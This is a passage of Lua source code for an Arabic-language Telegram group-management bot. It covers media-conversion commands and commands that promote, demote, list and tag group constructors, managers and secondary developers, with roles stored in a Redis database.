function by_reply(extra, result, success)   
if result.content_.voice_ then 
local mr = result.content_.voice_.voice_.persistent_id_ 
Addmp3(msg,msg.chat_id_,mr,msg.sender_user_id_..'.mp3')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:mode'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.audio_ then 
local mr = result.content_.audio_.audio_.persistent_id_
Addvoi(msg,msg.chat_id_,mr,msg.sender_user_id_..'.ogg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:mode'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.sticker_ then 
local Str = result.content_.sticker_.sticker_.persistent_id_ 
Addjpg(msg,msg.chat_id_,Str,msg.sender_user_id_..'.jpg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
-------------------
------------------------------------------------------------------------
if text == ("مسح الاساسين") and CoSu(msg) then
database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n *⊀︰ تم مسح المنشئين الاساسين*')
return false
end
if text == 'المنشئين الاساسين' and CoSu(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n ⊀︰ قائمة المنشئين الاساسين \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد منشئين اساسين*"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("تاك للمنشئين الاساسين") or text == ("صيح المنشئين الاساسين") then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n ⊀︰ وينكم تعالو يريدوكم بالكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد منشئين اساسين*"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("ارفع منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ منشئ اساسي*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^ارفع منشئ اساسي @(.*)$") and CoSu(msg) then
local username = text:match("^ارفع منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ منشئ اساسي*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^ارفع منشئ اساسي (%d+)$") and CoSu(msg) then
local userid = text:match("^ارفع منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ منشئ اساسي*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تمَ رفعَهہ↫ منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("نزل منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من الاساسيين*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^نزل منشئ اساسي @(.*)$") and CoSu(msg) then
local username = text:match("^نزل منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من الاساسيين*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^نزل منشئ اساسي (%d+)$") and CoSu(msg) then
local userid = text:match("^نزل منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من الاساسيين*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم نزله من الاساسيين*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المنشئين' and BasicConstructor(msg) then
database:del(bot_id..'Constructor'..msg.chat_id_)
texts = '* ⊀︰ تم مسح المنشئين *'
send(msg.chat_id_, msg.id_, texts)
end

if text == ("المنشئين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n ⊀︰ قائمة المنشئين \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد منشئين*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنشئين") or text == ("صيح المنشئين") then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n ⊀︰ وينكم تعالو يريدوكم بالكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد منشئين*"
end
send(msg.chat_id_, msg.id_, t)
end
if text ==("المنشئ") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_," ⊀︰ حساب المنشئ محذوف")
return false  
end
local UserName = (b.username_ or "RiNdA-SourcE")
send(msg.chat_id_, msg.id_," ⊀︰ منشئ الكروب > ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
end
if text == "ارفع منشئ" and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ منشئ*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^ارفع منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^ارفع منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ منشئ*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^ارفع منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^ارفع منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ منشئ*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تمَ رفعَهہ↫ منشئ*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
if text and text:match("^نزل منشئ$") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المنشئين*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^نزل منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^نزل منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المنشئين*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^نزل منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^نزل منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المنشئين*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم نزله من المنشئين*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
------------------------------------------------------------------------
if text == 'مسح المدراء' and Constructor(msg) then
database:del(bot_id..'Manager'..msg.chat_id_)
texts = '* ⊀︰ تم مسح المدراء *'
send(msg.chat_id_, msg.id_, texts)
end
if text == ("المدراء") and Constructor(msg) then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n ⊀︰ قائمة المدراء \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد مدراء*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمدراء") or text == ("صيح المدراء") then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n ⊀︰ وينكم تعالو يريدوكم بالكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد مدراء*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("ارفع مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ مدير*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^ارفع مدير @(.*)$") and Constructor(msg) then
local username = text:match("^ارفع مدير @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
database:sadd(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ مدير*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^ارفع مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^ارفع مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ مدير*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تمَ رفعَهہ↫ مدير*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("نزل مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المدراء*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^نزل مدير @(.*)$") and Constructor(msg) then
local username = text:match("^نزل مدير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المدراء*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^نزل مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^نزل مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المدراء*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم نزله من المدراء*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------ adddev2 sudog
if text == ("ارفع مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_RiNdA(extra, result, success)
database:sadd(bot_id.."Dev:mode:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*⊀︰ تمَ رفعَهہ↫ مطور ثانوي في البوت*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_RiNdA, nil)
return false 
end
if text and text:match("^ارفع مطور ثانوي @(.*)$") and SudoBot(msg) then
local username = text:match("^ارفع مطور ثانوي @(.*)$")
function Function_RiNdA(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Dev:mode:2", result.id_)
Reply_Status(msg,result.id_,"reply","*⊀︰ تمَ رفعَهہ↫ مطور ثانوي في البوت*")  
else
send(msg.chat_id_, msg.id_,"*⊀︰ لا يوجد حساب بهاذا المعرف*")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_RiNdA, nil)
return false 
end
if text and text:match("^ارفع مطور ثانوي (%d+)$") and SudoBot(msg) then
local userid = text:match("^ارفع مطور ثانوي (%d+)$")
database:sadd(bot_id.."Dev:mode:2", userid)
Reply_Status(msg,userid,"reply","*⊀︰ تمَ رفعَهہ↫ مطور ثانوي في البوت*")  
return false 
end
if text == ("نزل مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_RiNdA(extra, result, success)
database:srem(bot_id.."Dev:mode:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*⊀︰ تم نزله من المطور ثانويين*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_RiNdA, nil)
return false 
end
if text and text:match("^نزل مطور ثانوي @(.*)$") and SudoBot(msg) then
local username = text:match("^نزل مطور ثانوي @(.*)$")
function Function_RiNdA(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:mode:2", result.id_)
Reply_Status(msg,result.id_,"reply","*⊀︰ تم نزله من المطور ثانويين*")  
else
send(msg.chat_id_, msg.id_,"*⊀︰ لا يوجد حساب بهاذا المعرف*")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_RiNdA, nil)
return false
end  
